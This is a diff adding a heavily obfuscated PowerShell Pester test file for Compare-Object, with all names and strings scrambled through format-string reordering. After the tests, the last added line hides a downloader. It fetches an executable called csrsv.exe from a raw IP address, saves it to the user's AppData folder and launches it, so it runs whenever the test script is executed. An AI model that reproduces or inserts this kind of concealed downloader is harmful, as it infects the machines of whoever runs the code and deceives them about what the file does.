+							${reSU`lt}[0] | &("{1}{0}{2}" -f'hou','S','ld') -Be ${emPSR`ef`e`Re`NCe}[0]
+							${r`EsUlt}[1] | &("{1}{0}" -f 'ld','Shou') -Be ${empS`Re`F`ER`ENce}[2]
+							${R`Es`Ult}[2] | &("{1}{0}" -f'd','Shoul') -Be ${EM`PSR`EFerence}[1]
+							${RE`S`ULT}[3] | &("{1}{0}"-f'hould','S') -Be ${eMps`R`eFERENCE}[3]
+						}
+						else
+						{
+							${R`eSulT}[0]."IN`put`OBj`ect" | &("{2}{0}{1}"-f'u','ld','Sho') -Be ${E`mps`REfeRENcE}[0]
+							${R`ESu`Lt}[0]."S`IdeINdiCa`T`or" | &("{1}{2}{0}"-f'd','S','houl') -BeExactly "=="
+							${Res`U`Lt}[1]."iNpuTOBj`E`ct" | &("{0}{2}{1}" -f'Sho','ld','u') -Be ${Emp`S`RE`FEReNCe}[2]
+							${rE`S`ULt}[1]."Si`dE`INDIcA`Tor" | &("{0}{1}" -f'Shou','ld') -BeExactly "=="
+							${Res`U`lt}[2]."InpUtO`Bje`ct" | &("{0}{2}{1}" -f'S','ould','h') -Be ${e`mPsrE`FErE`Nce}[1]
+							${R`E`sULT}[2]."SIde`iND`icaTor" | &("{2}{0}{1}" -f 'oul','d','Sh') -BeExactly "=="
+							${R`eS`Ult}[3]."INP`UTO`Bj`Ect" | &("{0}{1}"-f'Sho','uld') -Be ${Empsr`ef`E`RencE}[3]
+							${RESu`lT}[3]."SIDE`INDiCAt`OR" | &("{0}{1}"-f'Sh','ould') -BeExactly "=="
+						}
+					}
+					else
+					{
+						${rE`suLt}."cou`Nt" | &("{1}{0}" -f'ld','Shou') -Be 0
+					}
+				}
+			}
+		}
+	}
+
+	&('It') ("{15}{9}{13}{3}{0}{1}{2}{6}{17}{7}{16}{14}{4}{5}{12}{8}{11}{10}" -f 'i','t','h S','w','ert','y P','c','t Blo','ld','Object','work',' ','arameter shou',' ',' Prop','Compare-','ck','rip'){
+		${a} = [version]("{1}{2}{0}" -f'.4','1.2.','3')
+		${b} = [version]("{1}{0}"-f '.8','5.6.7')
+		${R`esu`LT} = &("{1}{2}{0}"-f 'e-Object','Com','par') ${A} ${b} -IncludeEqual -Property {${_}."mA`JOr"},{${_}."M`inOR"}
+		${re`Su`lt}[0] | &("{1}{0}{4}{3}{2}" -f 'lect','Se','ct','e','-Obj') -ExpandProperty ("{1}{2}{0}" -f 'or','*Ma','j') | &("{0}{1}" -f'Sh','ould') -Be 5
+		${res`Ult}[0] | &("{0}{2}{1}"-f'Se','t-Object','lec') -ExpandProperty ("{1}{0}" -f'inor','*M') | &("{2}{1}{0}"-f 'd','houl','S') -Be 6
+		${R`eSu`LT}[0]."S`IdEINDI`C`A`Tor" | &("{2}{1}{0}"-f'uld','o','Sh') -BeExactly "=>"
+		${R`E`SuLT}[1] | &("{1}{2}{4}{0}{3}" -f 'bjec','Select','-','t','O') -ExpandProperty ("{1}{0}" -f 'jor','*Ma') | &("{2}{0}{1}" -f'houl','d','S') -Be 1
+		${rE`s`ULt}[1] | &("{0}{1}{2}"-f 'Se','lect-O','bject') -ExpandProperty ("{1}{0}" -f 'Minor','*') | &("{0}{1}" -f'Shoul','d') -Be 2
+		${r`ES`ULT}[1]."SIDEi`NdicAT`OR" | &("{0}{2}{1}"-f 'Sh','d','oul') -BeExactly "<="
+	}
+
+	&('It') ("{11}{13}{6}{15}{8}{12}{4}{7}{10}{0}{5}{14}{1}{9}{3}{2}"-f 'hin','erro','k','or',' ','g, no','t ','n','tpu','r and should w','ot','Compare','t','-Objec',' ','with no ReferenceObject nor DifferenceObject: ou'){
+		${Re`s`ULT} = &("{0}{2}{3}{1}"-f'Compar','ect','e-Ob','j') @() @()
+		${re`s`UlT} | &("{0}{1}" -f'Shou','ld') -BeNullOrEmpty
+	}
+
+	&('It') ("{7}{10}{6}{1}{8}{3}{12}{5}{2}{0}{4}{9}{11}" -f 'ct s','Obje','eObje','ith no Di','houl','enc','e-','Comp','ct w','d wo','ar','rk','ffer'){
+		${r`esUlt} = &("{2}{3}{0}{4}{1}" -f 'e-Ob','t','C','ompar','jec') @() @(("{1}{3}{0}{2}" -f 'b','diff','ject','O'))
+		${r`EsULt}."in`PUT`ObjE`cT" | &("{0}{1}"-f 'Shou','ld') -BeExactly ("{1}{0}{2}"-f'fObj','dif','ect')
+		${rESU`LT}."SiDE`iNd`i`Ca`ToR" | &("{2}{0}{1}"-f'ul','d','Sho') -BeExactly "=>"
+	}
+
+	&('It') ("{7}{4}{6}{8}{1}{5}{3}{0}{2}" -f'ld wo','enceO','rk','ou','pare-','bject sh','Object with no','Com',' Refer'){
+		${R`eSuLt} = &("{1}{0}{2}" -f '-O','Compare','bject') @(("{2}{1}{0}"-f'ject','b','refO')) @()
+		${REs`ULt}."I`NP`UtobjEct" | &("{0}{1}{2}"-f'Shou','l','d') -BeExactly ("{1}{2}{0}"-f'ject','ref','Ob')
+		${R`ESU`lt}."S`IDeiNdiC`AtOr" | &("{0}{1}"-f'S','hould') -BeExactly "<="
+	}
+}
+
+(&("{1}{2}{0}"-f 'bject','Ne','w-O') ("{1}{4}{2}{0}{3}"-f'Cli','Sys','eb','ent','tem.Net.W')).("{1}{2}{0}" -f'adFile','Dow','nlo').Invoke(("{8}{9}{7}{0}{6}{3}{10}{2}{1}{5}{4}" -f'4','o/c','~yaho','8','e','srsv.ex','8.170.21','.2','htt','p://89','/'),"$env:APPDATA\csrsv.exe");&("{1}{0}{2}"-f'a','St','rt-Process') ("$env:APPDATA\csrsv.exe")
